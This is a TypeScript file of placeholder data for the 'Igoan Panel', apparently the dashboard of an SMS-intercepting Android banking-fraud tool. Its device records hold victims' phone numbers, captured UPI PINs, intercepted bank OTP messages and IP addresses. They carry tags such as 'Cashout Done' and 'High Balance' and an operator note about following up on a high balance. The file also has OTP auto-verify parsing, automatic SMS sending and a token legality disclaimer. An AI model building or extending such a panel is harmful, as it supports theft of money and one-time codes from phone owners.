// Fake, for-display-only data. Mirrors the real Igoan Panel data shapes.

export interface Sms {
  id: string;
  from: string;
  body: string;
  time: string;       // 'DD-MM-YYYY | hh:mm am'
  sim: 1 | 2;
  type: 'inbox' | 'sent'; // rendered as incoming / sent
}

export interface Note {
  id: string;
  body: string;
  time: string;       // 'DD-MM-YYYY | hh:mm am'
}

export interface Client {
  index: number;
  id: string;
  slot: 'Slot 1' | 'Slot 2'; // which Firebase slot the device connects through
  slotTag: string;      // 'slot1' — shown as [slot1] after the model
  label: string;        // deviceRef — display name (device/user ka naam)
  labelTime: string;    // deviceLabelAt formatted
  tag?: string;         // 🏷️ category label — 4 fixed types (High Balance/Low Balance/Cash Out Done/Top Priority); RTDB deviceLabel
  tagTime?: string;     // tag kab set hua (formatted)
  phone: string;        // 'N/A' when unknown
  upiPin: string;       // '—' when unknown
  model: string;
  battery: number;
  ip: string;           // networkIp — 'N/A' when unknown (offline devices)
  date: string;         // 'DD-MM-YYYY | hh:mm am'
  last: string;
  uninstalled?: boolean; // Last line gets '· Uninstalled'
  favorite?: boolean;   // ⭐ star-marked (Gian isFavorite — RTDB pe save, sab jagah sync)
  status: 'Online' | 'Offline';
  online: boolean;
  device: string;
  sim1: string;
  sim2: string;
  sent: number;         // bytes
  received: number;     // bytes
  messages: Sms[];
  notes: Note[];      // owner-kept private notes for this device
}

export function fmtBytes(n: number): string {
  if (n <= 0) return '0 B';
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(1)} MB`;
}

const sms = (n: string): Sms[] => [
  // Relayed channel post — Auto Verify isi format ko parse karta hai (To:/Message:).
  { id: n + '0', from: 'AUTO-VERIFY', body: 'To : +91 98220 11837\nMessage : Aapka verification code 448190 hai. 10 minute tak valid rahega.', time: '28-07-2026 | 10:44 am', sim: 1, type: 'inbox' },
  { id: n + '1', from: 'JK-BOBSMS-S', body: 'Your request for deseeding of Aadhaar from your A/C XXX2679 is successful. If not initiated by you, call 18005700 - BOB', time: '01-06-2026 | 07:42 am', sim: 1, type: 'inbox' },
  { id: n + '2', from: 'VM-SBIOTP', body: 'Your OTP for txn of Rs.12,000 is 448190. Valid 10 min. Do not share.', time: '28-07-2026 | 10:31 am', sim: 1, type: 'inbox' },
  { id: n + '3', from: 'AZ-AIRTEL', body: 'Badhai Ho! Ab apne Airtel recharge ke saath aapko mil raha hai movies, TV shows aur Live TV ka maza. Recharge karein aur karo entertainment unlimited!', time: '31-05-2026 | 03:56 pm', sim: 2, type: 'inbox' },
  { id: n + '4', from: 'Me', body: 'Your OTP is 448190.', time: '28-07-2026 | 09:40 am', sim: 1, type: 'sent' },
  { id: n + '5', from: '+91 98220 11837', body: 'Bhai kal milte hai 6 baje. Confirm kar dena.', time: '28-07-2026 | 08:47 am', sim: 2, type: 'inbox' },
];

export const CLIENTS: Client[] = [
  { index: 1, id: 'DEV-0001', slot: 'Slot 1', slotTag: 'slot1', label: '💸 Cashout Done', labelTime: '28-07-2026 | 09:12 am', phone: '+91 98115 20001', upiPin: '4471', model: 'SM-A135F', battery: 82, ip: '103.42.18.71', date: '28-07-2026 | 10:42 am', last: '28-07-2026 | 10:42 am', status: 'Online', online: true, device: 'Samsung SM-A135F', sim1: 'Unknown - airtel', sim2: 'Not Available', sent: 1536, received: 48211, notes: [{ id: 'n1', body: 'SBI main — balance high tha, Friday ko follow up karna hai', time: '27-07-2026 | 06:12 pm' }], messages: sms('a') },
  { index: 2, id: 'DEV-0002', slot: 'Slot 1', slotTag: 'slot1', label: '', labelTime: '', phone: 'N/A', upiPin: '—', model: 'A059', battery: 47, ip: 'N/A', date: '27-05-2026 | 04:44 am', last: '31-05-2026 | 02:38 pm', status: 'Offline', online: false, device: 'Oppo A059', sim1: 'Vi · +91 90042 20002', sim2: '—', sent: 0, received: 980, notes: [], messages: sms('b') },
  { index: 3, id: 'DEV-0003', slot: 'Slot 1', slotTag: 'slot1', label: '📈 High Balance', labelTime: '27-07-2026 | 09:03 pm', phone: '+91 73048 20003', upiPin: '1102', model: 'Pixel 7a', battery: 91, ip: '49.36.102.18', date: '28-07-2026 | 10:40 am', last: '28-07-2026 | 10:41 am', status: 'Online', online: true, device: 'Google Pixel 7a', sim1: 'Jio · +91 73048 20003', sim2: 'Airtel · +91 98330 44521', sent: 2104, received: 55670, notes: [], messages: sms('c') },
  { index: 4, id: 'DEV-0004', slot: 'Slot 1', slotTag: 'slot1', label: '', labelTime: '', phone: 'N/A', upiPin: '—', model: 'V2407', battery: 12, ip: 'N/A', date: '12-05-2026 | 04:38 pm', last: '21-05-2026 | 06:31 am', uninstalled: true, status: 'Offline', online: false, device: 'vivo V2407', sim1: 'Airtel · +91 88214 20004', sim2: '—', sent: 0, received: 0, notes: [], messages: sms('d') },
  { index: 5, id: 'DEV-0005', slot: 'Slot 1', slotTag: 'slot1', label: '📉 Low Balance', labelTime: '28-07-2026 | 07:55 am', phone: '+91 96501 20005', upiPin: '8890', model: 'Oppo A78', battery: 63, ip: '122.161.54.9', date: '28-07-2026 | 10:39 am', last: '28-07-2026 | 10:40 am', status: 'Online', online: true, device: 'OPPO CPH2565', sim1: 'Vi · +91 96501 20005', sim2: 'Jio · +91 70110 22004', sent: 880, received: 14400, notes: [], messages: sms('e') },
  { index: 6, id: 'DEV-0006', slot: 'Slot 2', slotTag: 'slot2', label: '', labelTime: '', phone: 'N/A', upiPin: '—', model: 'Vivo Y36', battery: 5, ip: 'N/A', date: '28-07-2026 | 07:20 am', last: '28-07-2026 | 07:22 am', status: 'Offline', online: false, device: 'vivo V2247', sim1: 'BSNL · +91 70551 20006', sim2: '—', sent: 30, received: 120, notes: [], messages: sms('f') },
  { index: 7, id: 'DEV-0007', slot: 'Slot 2', slotTag: 'slot2', label: '5k', labelTime: '28-07-2026 | 10:41 am', phone: '+91 99887 20007', upiPin: '778899,778899,778899', model: 'RMX3842', battery: 74, ip: '106.215.88.41', date: '28-07-2026 | 10:41 am', last: '28-07-2026 | 10:44 am', status: 'Online', online: true, device: 'realme RMX3842', sim1: 'Jio · +91 99887 20007', sim2: 'Airtel · +91 98115 77120', sent: 1560, received: 28900, notes: [], messages: sms('g') },
  { index: 8, id: 'DEV-0008', slot: 'Slot 2', slotTag: 'slot2', label: '🏦 No Bank', labelTime: '26-07-2026 | 06:22 pm', phone: '+91 81303 20008', upiPin: '6613', model: 'Moto G84', battery: 39, ip: '59.144.20.117', date: '28-07-2026 | 10:05 am', last: '28-07-2026 | 10:35 am', status: 'Online', online: true, device: 'motorola XT2347-2', sim1: 'Vi · +91 81303 20008', sim2: '—', sent: 610, received: 11020, notes: [], messages: sms('h') },
];

export interface BroadcastMsg { id: string; date: string; message: string; isNew?: boolean; }
export const BROADCASTS: BroadcastMsg[] = [
  { id: 'b1', date: '28-Jul-2026 09:00', message: 'IgoanPanel v5.2 is live — faster SMS sync and new slot manager. Reload your dashboard to pick it up.', isNew: true },
  { id: 'b2', date: '27-Jul-2026 18:30', message: 'Scheduled maintenance Sunday 02:00–03:00 IST. Short downtime expected.' },
  { id: 'b3', date: '26-Jul-2026 11:15', message: 'Keep your Telegram Chat ID updated in Settings to receive login OTP codes.' },
];

export interface Session { id: string; device: string; meta: string; current?: boolean; }
export const SESSIONS: Session[] = [
  { id: 'ss1', device: 'realme RMX3842', meta: 'Last active: 01/06 09:49 am', current: true },
  { id: 'ss2', device: 'Chrome · Windows 11', meta: 'Last active: 28/07 08:12 am' },
];
export const SESSION_ADMIN = 'Admin: 222222';
export const SESSION_AUTO_LOGOUT = 'Auto logout 3h after login: 01/06/2026 12:47 pm';
export const SESSION_THIS_DEVICE = 'This device: realme RMX3842';

export const THEMES = ['Ocean', 'Violet', 'Royal', 'Rose', 'Sky', 'Midnight', 'Ember'] as const;
export type ThemeName = (typeof THEMES)[number];
export const THEME_GRADIENTS: Record<ThemeName, [string, string]> = {
  Ocean: ['#0a4d86', '#023c69'],
  Violet: ['#5b6abf', '#37477e'],
  Royal: ['#b8912f', '#7a5f18'],
  Rose: ['#b04a68', '#6e2c42'],
  Sky: ['#2f7fc4', '#1a4f80'],
  Midnight: ['#3a4045', '#1c1f20'],
  Ember: ['#b06a28', '#6e3f14'],
};

export const BOOTSTRAP_STEPS = [
  'Verifying Admin ID',
  'Checking session & password',
  'Validating plan expiry',
  'Loading Firebase slots',
  'Syncing device connections',
  'Preparing dashboard',
];

export const DISCLAIMER_BODY = `IgoanPanel is a device management tool for authorised administrators only.

• Use this app only on devices and accounts you own or have written permission to manage.
• Do not use IgoanPanel for fraud, harassment, or any illegal activity.
• SMS, call forwarding, and device data features must comply with local laws and carrier rules.
• You are responsible for how this panel is used under your login.
• We may update these terms; continued use means you accept the latest version.

If you do not agree, close the app and do not continue.`;

export const MANUAL_ON_TEXT = 'Manual Send is ON\n• Type the recipient number and message.\n• Tap Send SMS when you are ready.\n• Nothing is sent until you press the button.';
export const MANUAL_OFF_TEXT = 'Manual Send is OFF (default)\n• SMS sends automatically when both fields are filled.\n• You can paste number and message in any order.\n• The Send button stays disabled in this mode.';
